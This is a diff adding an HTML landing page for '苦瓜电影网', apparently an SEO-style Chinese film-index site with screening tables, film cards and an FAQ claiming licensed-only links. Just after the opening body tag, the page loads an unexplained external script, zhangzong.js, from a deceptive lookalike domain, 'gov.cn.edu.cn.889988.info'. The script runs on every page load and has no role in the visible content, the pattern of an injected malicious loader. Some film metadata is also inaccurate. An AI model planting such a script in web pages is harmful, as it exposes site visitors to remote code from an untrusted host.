@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>苦瓜电影网 - kuguadianyingwang-zh.com.github.io | 电影资料索引与正版排片入口</title>
+<meta name="description" content="苦瓜电影网（kuguadianyingwang-zh.com.github.io）做电影资料与正版观看入口索引，覆盖华语、欧美、日韩、冷门修复与院线新片排片。网址 https://kuguadianyingwang-zh.com.github.io ，不提供在线播放，仅标注已核实正版渠道。">
+<meta name="keywords" content="苦瓜电影网,kuguadianyingwang-zh,电影索引,电影排片,正版电影入口,冷门电影,华语电影,欧美电影,日韩电影,4K修复">
+<meta name="author" content="苦瓜电影网编辑部">
+<link rel="canonical" href="https://kuguadianyingwang-zh.com.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="苦瓜电影网 - kuguadianyingwang-zh.com.github.io">
+<meta property="og:description" content="苦瓜电影网，电影资料索引与正版排片入口。网址 https://kuguadianyingwang-zh.com.github.io">
+<meta property="og:url" content="https://kuguadianyingwang-zh.com.github.io/">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="苦瓜电影网 - kuguadianyingwang-zh.com.github.io">
+<meta name="twitter:description" content="苦瓜电影网，电影排片与正版入口索引站。https://kuguadianyingwang-zh.com.github.io">
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"苦瓜电影网",
+  "alternateName":"kuguadianyingwang-zh.com.github.io",
+  "url":"https://kuguadianyingwang-zh.com.github.io/",
+  "description":"电影资料索引与正版观看入口导航站",
+  "inLanguage":"zh-CN"
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"Organization",
+  "name":"苦瓜电影网",
+  "url":"https://kuguadianyingwang-zh.com.github.io/",
+  "slogan":"像苦瓜一样，把冷门好片挑出来"
+}
+</script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --paper:#f3f6ec;
+  --panel:#ffffff;
+  --ink:#1f2a1c;
+  --green:#2f6b3a;
+  --green-d:#1d4426;
+  --bitter:#d9a521;
+  --line:#cdddd0;
+  --mut:#6c7c63;
+  --ok:#2f8f4e;
+  --soon:#cf8a16;
+  --end:#81907a;
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei",system-ui,-apple-system,Segoe UI,sans-serif;
+  background:
+    repeating-linear-gradient(135deg,rgba(47,107,58,.05) 0 2px,transparent 2px 22px),
+    var(--paper);
+  color:var(--ink);
+  line-height:1.68;
+  -webkit-font-smoothing:antialiased;
+}
+.wrap{max-width:1120px;margin:0 auto;padding:0 18px}
+a{color:var(--green);text-decoration:none}
+a:hover{text-decoration:underline}
+
+/* 状态条 */
+.topbar{background:var(--green-d);color:#eaf2e2;font-size:12.5px}
+.topbar .wrap{display:flex;flex-wrap:wrap;gap:14px;justify-content:space-between;padding:8px 18px}
+.topbar b{color:var(--bitter);font-weight:600}
+.seed{display:inline-block;width:8px;height:8px;border-radius:50%;background:#8fd06a;margin-right:6px;vertical-align:middle;animation:blink 1.7s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.35}}
+
+/* 报头 */
+header.masthead{padding:26px 0 18px;border-bottom:3px solid var(--green)}
+header.masthead .wrap{display:flex;flex-wrap:wrap;align-items:flex-end;gap:16px}
+.brand{position:relative;padding-left:54px}
+.brand:before{content:"";position:absolute;left:0;top:2px;width:42px;height:42px;border-radius:50%;
+  background:radial-gradient(circle at 35% 30%,#bfe39a 0 18%,transparent 19%),
+            linear-gradient(160deg,var(--green),var(--green-d));
+  box-shadow:inset 0 0 0 3px #e7efdc;}
+.brand h1{font-size:33px;font-weight:800;letter-spacing:.02em;line-height:1.1}
+.brand h1 span{color:var(--green)}
+.brand .sub{font-size:13px;color:var(--mut);margin-top:6px}
+.urlchip{margin-left:auto;background:var(--green-d);color:var(--bitter);font-size:12px;padding:7px 11px;border-radius:4px;font-family:ui-monospace,Menlo,Consolas,monospace}
+
+/* 导航 */
+nav.nav{background:var(--green)}
+nav.nav .wrap{display:flex;flex-wrap:wrap;gap:2px;padding:0}
+nav.nav a{color:#eef5e8;font-size:14px;padding:11px 13px;display:block;border-right:1px solid rgba(255,255,255,.12)}
+nav.nav a:hover{background:linear-gradient(90deg,rgba(217,165,33,.35),rgba(47,107,58,.25));text-decoration:none}
+nav.nav a .no{color:var(--bitter);font-size:11px;margin-right:5px;font-family:ui-monospace,monospace}
+
+/* 区块 */
+section{padding:34px 0;border-bottom:1px solid var(--line)}
+.sec-head{display:flex;align-items:baseline;gap:12px;margin-bottom:18px;flex-wrap:wrap}
+.sec-head h2{font-size:22px;font-weight:800}
+.sec-head .tag{background:var(--green-d);color:var(--bitter);font-size:11px;padding:3px 8px;border-radius:3px;font-family:ui-monospace,monospace}
+.sec-head .note{font-size:12.5px;color:var(--mut);margin-left:auto}
+
+#home p.lead{font-size:17px;max-width:780px}
+#home p.lead b{color:var(--green)}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-top:22px}
+.stat{background:var(--panel);border:1px solid var(--line);border-top:3px solid var(--bitter);padding:14px}
+.stat .n{font-size:26px;font-weight:800;color:var(--green-d)}
+.stat .t{font-size:12px;color:var(--mut)}
+
+/* 排片 */
+table.sched{width:100%;border-collapse:collapse;background:var(--panel);font-size:14px}
+table.sched th,table.sched td{border:1px solid var(--line);padding:9px 10px;text-align:left;vertical-align:top}
+table.sched th{background:var(--green-d);color:#eef5e8;font-weight:600;font-size:13px}
+table.sched tr:nth-child(even) td{background:#f7faf2}
+.fmt{display:inline-block;font-size:11px;padding:2px 6px;border-radius:3px;background:#eef5e8;color:var(--green-d);border:1px solid var(--line)}
+.fmt.fix{color:var(--green);border-color:#bcd9bf}
+.fmt.bd{color:var(--bitter);border-color:#e3cf94}
+.st{font-weight:700;font-size:12px}
+.st.ok{color:var(--ok)} .st.soon{color:var(--soon)} .st.end{color:var(--end)}
+
+/* 卡片 */
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.card{background:var(--panel);border:1px solid var(--line);padding:15px;position:relative}
+.card:before{content:"";position:absolute;left:0;top:0;right:0;height:4px;
+  background:repeating-linear-gradient(90deg,var(--green) 0 8px,var(--bitter) 8px 16px,transparent 16px 22px);}
+.card h3{font-size:16px;margin-bottom:4px;padding-top:4px}
+.card .meta{font-size:12px;color:var(--mut);font-family:ui-monospace,monospace}
+.card p{font-size:13px;margin-top:7px;color:#33402c}
+
+/* 冷门 */
+.cool{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
+.cool .row{background:var(--panel);border:1px solid var(--line);padding:14px;display:flex;gap:12px;align-items:flex-start}
+.cool .leaf{width:40px;height:40px;flex:0 0 40px;border-radius:6px 6px 6px 2px;
+  background:linear-gradient(135deg,var(--green),var(--bitter));}
+.cool .row b{font-size:15px}
+.cool .row span{font-size:12px;color:var(--mut);display:block}
+
+/* 分类 */
+.filter{display:grid;grid-template-columns:repeat(2,1fr);gap:12px}
+.filter .row{background:var(--panel);border:1px solid var(--line);padding:13px}
+.filter .row b{color:var(--green-d);font-size:14px}
+.filter .row span{font-size:13px;color:var(--mut);display:block;margin-top:4px}
+
+/* 正版说明 */
+.terms{width:100%;border-collapse:collapse;background:var(--panel);font-size:14px}
+.terms th,.terms td{border:1px solid var(--line);padding:9px 11px;text-align:left;vertical-align:top}
+.terms th{background:#eef5e8;color:var(--green-d);width:30%}
+code{background:#eef5e8;border:1px solid var(--line);padding:1px 6px;border-radius:3px;font-size:13px;color:var(--green-d)}
+
+/* FAQ */
+.faq{border:1px solid var(--line);background:var(--panel);margin-bottom:10px}
+.faq summary{padding:12px 14px;font-weight:700;cursor:pointer;list-style:none}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary:before{content:"＋ ";color:var(--green);font-weight:800}
+.faq[open] summary:before{content:"－ "}
+.faq p{padding:0 14px 13px;font-size:14px;color:#33402c}
+
+/* 地图 */
+.map{display:grid;grid-template-columns:repeat(4,1fr);gap:10px}
+.map a{display:block;background:var(--panel);border:1px solid var(--line);padding:11px 12px;border-radius:4px;color:var(--ink);font-size:14px}
+.map a:hover{text-decoration:none;border-color:var(--green);background:#f7faf2}
+.map a .l{color:var(--bitter);font-family:ui-monospace,monospace;font-size:11px;margin-right:6px}
+
+/* 页脚 */
+footer{background:var(--green-d);color:#d7e3cd;padding:26px 0;font-size:13px}
+footer .wrap{display:flex;flex-wrap:wrap;gap:16px;justify-content:space-between}
+footer a{color:var(--bitter)}
+footer .copy{width:100%;border-top:1px solid rgba(255,255,255,.14);margin-top:14px;padding-top:12px;color:#a9bda0;font-size:12px}
+
+@media(max-width:880px){
+  .stats{grid-template-columns:repeat(2,1fr)}
+  .grid{grid-template-columns:repeat(2,1fr)}
+  .cool{grid-template-columns:1fr}
+  .filter{grid-template-columns:1fr}
+  .map{grid-template-columns:repeat(2,1fr)}
+  .brand h1{font-size:27px}
+  .urlchip{margin-left:0}
+  nav.nav .wrap{flex-direction:column}
+  nav.nav a{border-right:none;border-bottom:1px solid rgba(255,255,255,.12)}
+  table.sched{display:block;overflow-x:auto;white-space:nowrap}
+}
+@media(max-width:520px){
+  .stats{grid-template-columns:1fr}
+  .grid{grid-template-columns:1fr}
+  .map{grid-template-columns:1fr}
+  .brand{padding-left:46px}
+  .brand:before{width:36px;height:36px}
+  .brand h1{font-size:23px}
+  .sec-head .note{display:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="topbar">
+  <div class="wrap">
+    <span><span class="seed"></span>索引服务：正常采摘</span>
+    <span>本期编号：<b>KG-MOVIE-2026Q4</b></span>
+    <span>补录批次：每日 09:30 / 21:30</span>
+    <span>网址：<b>kuguadianyingwang-zh.com.github.io</b></span>
+  </div>
+</div>
+
+<header class="masthead">
+  <div class="wrap">
+    <div class="brand">
+      <h1><span>苦瓜</span>电影网</h1>
+      <div class="sub">电影资料索引 · 院线排片检索 · 冷门修复挖掘 · 正版观看入口标注</div>
+    </div>
+    <div class="urlchip">https://kuguadianyingwang-zh.com.github.io</div>
+  </div>
+</header>
+
+<nav class="nav">
+  <div class="wrap">
+    <a href="#home"><span class="no">01</span>首页导视</a>
+    <a href="#sched"><span class="no">02</span>本周排片</a>
+    <a href="#lib"><span class="no">03</span>影片库</a>
+    <a href="#cool"><span class="no">04</span>冷门修复</a>
+    <a href="#filter"><span class="no">05</span>分类检索</a>
+    <a href="#terms"><span class="no">06</span>正版说明</a>
+    <a href="#faq"><span class="no">07</span>常见问题</a>
+    <a href="#map"><span class="no">08</span>站点地图</a>
+  </div>
+</nav>
+
+<section id="home">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>首页导视</h2><span class="tag">FIELD 01</span>
+      <span class="note">苦瓜电影网站内总览</span>
+    </div>
+    <p class="lead"><b>苦瓜电影网</b>（<b>https://kuguadianyingwang-zh.com.github.io</b>）只做电影资料整理与正版入口索引：华语新片、欧美院线、日韩佳作、冷门老片与 4K/2K 修复片按“瓜田分区”归类，每部片标注年份、片长、语言、修复状态和已核实正版平台。本站不提供在线播放、不存储影视文件，主打“把难找但不难看”的片子挑出来。</p>
+    <div class="stats">
+      <div class="stat"><div class="n">4,012</div><div class="t">已登记影片</div></div>
+      <div class="stat"><div class="n">38</div><div class="t">本周在映排片</div></div>
+      <div class="stat"><div class="n">143</div><div class="t">冷门修复条目</div></div>
+      <div class="stat"><div class="n">9</div><div class="t">影片分类索引</div></div>
+    </div>
+  </div>
+</section>
+
+<section id="sched">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>本周排片</h2><span class="tag">FIELD 02</span>
+      <span class="note">院线/点播双来源索引</span>
+    </div>
+    <table class="sched">
+      <thead>
+        <tr><th>棚号</th><th>片名</th><th>格式</th><th>语言/字幕</th><th>场次</th><th>状态</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>A1</td><td>隐入尘烟（2022）</td><td><span class="fmt fix">4K修复</span></td><td>国语/中字</td><td>13:20 / 19:10</td><td class="st ok">售票中</td></tr>
+        <tr><td>A2</td><td>记忆（2023）</td><td><span class="fmt bd">蓝光源</span></td><td>原声/中字</td><td>14:00 / 20:30</td><td class="st ok">售票中</td></tr>
+        <tr><td>B1</td><td>燃烧（2018）</td><td><span class="fmt fix">2K修复</span></td><td>韩语/中字</td><td>16:10</td><td class="st soon">余票少</td></tr>
+        <tr><td>B2</td><td>路边野餐（2015）</td><td><span class="fmt fix">2K修复</span></td><td>贵州方言/中字</td><td>15:30</td><td class="st end">周末最后场</td></tr>
+        <tr><td>C1</td><td>瞬息全宇宙（2022）</td><td><span class="fmt">院线版</span></td><td>原声/中字</td><td>11:40 / 18:50</td><td class="st ok">售票中</td></tr>
+      </tbody>
+    </table>
+    <p style="font-size:12.5px;color:var(--mut);margin-top:10px">注：本排片表为苦瓜电影网自建索引，实际放映时间以院线及正版平台公示为准。网址 https://kuguadianyingwang-zh.com.github.io 仅作资料用途。</p>
+  </div>
+</section>
+
+<section id="lib">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>影片库</h2><span class="tag">FIELD 03</span>
+      <span class="note">华语 / 欧美 / 日韩 / 动画</span>
+    </div>
+    <div class="grid">
+      <div class="card"><h3>宇宙探索编辑部</h3><div class="meta">2021 · 117min · 荒诞/科幻</div><p>国产小成本条目，含伪纪录片版本与正版点播入口标注。</p></div>
+      <div class="card"><h3>过往人生</h3><div class="meta">2023 · 105min · 剧情</div><p>欧美独立片，原声/中字双轨，正版平台状态已核对。</p></div>
+      <div class="card"><h3>驾驶我的车</h3><div class="meta">2021 · 179min · 文艺</div><p>日片长版条目，含舞台剧片段与字幕版本说明。</p></div>
+      <div class="card"><h3>爱情神话</h3><div class="meta">2021 · 112min · 沪语/喜剧</div><p>上海方言条目，标注沪语原声与普通话配音差异。</p></div>
+      <div class="card"><h3>坠落</h3><div class="meta">2022 · 107min · 惊悚</div><p>欧美生存片，IMAX与常规版分开建档。</p></div>
+      <div class="card"><h3>鹿王：终极之王</h3><div class="meta">2019 · 115min · 动画</div><p>动画条目，正版流媒体与蓝光版本分别索引。</p></div>
+    </div>
+  </div>
+</section>
+
+<section id="cool">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>冷门修复</h2><span class="tag">FIELD 04</span>
+      <span class="note">难找但不难看</span>
+    </div>
+    <div class="cool">
+      <div class="row"><div class="leaf"></div><div><b>小武（1997）</b><span>贾樟柯处女作 · 2K修复</span>山西方言独立片，正版渠道较少，单独标注可看平台与地区限制。</div></div>
+      <div class="row"><div class="leaf"></div><div><b>铁西区（2003）</b><span>王兵纪录片 · 数字修复</span>三部长片分册索引，总片长与节选版分别登记。</div></div>
+      <div class="row"><div class="leaf"></div><div><b>我们俩（2005）</b><span>马俪文作品 · 2K修复</span>小成本老少题材，正版点播入口与字幕版本已补录。</div></div>
+      <div class="row"><div class="leaf"></div><div><b>诗（2010）</b><span>李沧东作品 · 4K修复</span>韩语文艺片，含母亲独白段落版本对照。</div></div>
+    </div>
+  </div>
+</section>
+
+<section id="filter">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>分类检索</h2><span class="tag">FIELD 05</span>
+      <span class="note">按地区/类型/版本/情绪</span>
+    </div>
+    <div class="filter">
+      <div class="row"><b>按地区</b><span>华语 / 欧美 / 日韩 / 东南亚 / 其他；支持“华语+冷门”“日韩+修复”等组合条件。</span></div>
+      <div class="row"><b>按类型</b><span>剧情、喜剧、科幻、悬疑、动画、纪录、文艺、惊悚九类分别建索引。</span></div>
+      <div class="row"><b>按版本</b><span>院线版 / 蓝光源 / 2K修复 / 4K修复 / 导演剪辑版，列表标签直接区分。</span></div>
+      <div class="row"><b>按观感</b><span>“下饭片”“硬核片”“慢炖片”“睡前片”等苦瓜自有标签，降低选片成本。</span></div>
+    </div>
+  </div>
+</section>
+
+<section id="terms">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>正版说明</h2><span class="tag">FIELD 06</span>
+      <span class="note">苦瓜电影网不播放只索引</span>
+    </div>
+    <table class="terms">
+      <tr><th>你关心的事</th><th>本站处理方式</th></tr>
+      <tr><td>能在线看吗</td><td>不能。苦瓜电影网只登记资料与已核实正版入口，不提供播放、不存储影视文件。</td></tr>
+      <tr><td><code>片名/别名</code></td><td>官方片名+通用译名+原名三字段匹配，方言片另标语言变体。</td></tr>
+      <tr><td><code>4K / 2K / 蓝光</code></td><td>版本字段单独标注，修复母带来源仅在已公开信息时填写。</td></tr>
+      <tr><td><code>正版平台</code></td><td>每部片列已核实平台名称；未核实的链接不写，避免导流盗版。</td></tr>
+      <tr><td><code>排片时间</code></td><td>排片表为索引演示，实际以院线和正版点播平台当期公示为准。</td></tr>
+    </table>
+    <p style="font-size:12.5px;color:var(--mut);margin-top:10px">苦瓜电影网（https://kuguadianyingwang-zh.com.github.io）所有检索结果为站内锚点跳转，不跳转外部未授权资源。</p>
+  </div>
+</section>
+
+<section id="faq">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>常见问题</h2><span class="tag">FIELD 07</span>
+      <span class="note">用户高频咨询</span>
+    </div>
+    <details class="faq" open>
+      <summary>苦瓜电影网为什么叫“苦瓜”？</summary>
+      <p>定位是挑冷门、修复、独立和小众好片，不追热点爆米花；名字借用“苦一阵、回甘”的选片逻辑，排片以资料价值为主而非票房。</p>
+    </details>
+    <details class="faq">
+      <summary>能直接在线看电影吗？</summary>
+      <p>不能。本站只做资料索引与正版入口标注，观看请走页面列出的已核实正版平台或院线场次。</p>
+    </details>
+    <details class="faq">
+      <summary>冷门片找不到正版入口怎么办？</summary>
+      <p>条目会标注“暂未检索到正版”并保留资料卡；用户可在正版说明区提交补录请求，编辑部按周整理上架。</p>
+    </details>
+    <details class="faq">
+      <summary>修复版和院线版怎么区分？</summary>
+      <p>列表用标签区分：4K修复、2K修复、蓝光源、导演剪辑、院线版；详情页写母带、分辨率、语言与字幕信息。</p>
+    </details>
+  </div>
+</section>
+
+<section id="map">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>站点地图</h2><span class="tag">FIELD 08</span>
+      <span class="note">站内锚点总览</span>
+    </div>
+    <div class="map">
+      <a href="#home"><span class="l">01</span>首页导视</a>
+      <a href="#sched"><span class="l">02</span>本周排片</a>
+      <a href="#lib"><span class="l">03</span>影片库</a>
+      <a href="#cool"><span class="l">04</span>冷门修复</a>
+      <a href="#filter"><span class="l">05</span>分类检索</a>
+      <a href="#terms"><span class="l">06</span>正版说明</a>
+      <a href="#faq"><span class="l">07</span>常见问题</a>
+      <a href="#map"><span class="l">08</span>本页地图</a>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div>
+      <strong style="color:#fff">苦瓜电影网</strong><br>
+      电影资料索引与正版排片入口站<br>
+      官方网址：<a href="https://kuguadianyingwang-zh.com.github.io">https://kuguadianyingwang-zh.com.github.io</a>
+    </div>
+    <div>
+      站内：<a href="#sched">排片</a> · <a href="#lib">影片库</a> · <a href="#cool">冷门</a> · <a href="#filter">分类</a><br>
+      本站不提供播放，仅标注正版入口
+    </div>
+    <div class="copy">
+      © 2026 苦瓜电影网 kuguadianyingwang-zh.com.github.io · 内容仅作电影资料索引用途 · 排片与观看渠道以院线及正版平台公示为准
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
